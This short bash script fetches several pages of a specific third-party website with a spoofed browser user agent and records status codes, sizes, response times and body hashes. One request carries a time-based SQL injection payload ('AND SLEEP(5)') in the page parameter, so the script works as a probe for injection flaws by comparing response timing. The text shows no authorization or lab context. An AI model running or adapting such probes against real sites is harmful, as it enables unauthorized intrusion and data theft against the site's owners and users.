#!/bin/bash
cd "$WORK_PATH"
UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
p(){ curl -s -A "$UA" -o /tmp/b_$$ -D /tmp/bh_$$ -w "%{http_code} %{size_download} t=%{time_total}" "$1"; echo " md5=$(md5sum /tmp/b_$$|cut -c1-8) $1"; }
p 'https://www.infinitycapital.bh/'
p 'https://www.infinitycapital.bh/?page=2'
p 'https://www.infinitycapital.bh/?page=2%20AND%20SLEEP(5)'
p 'https://www.infinitycapital.bh/contact'
p 'https://www.infinitycapital.bh/?page=2'
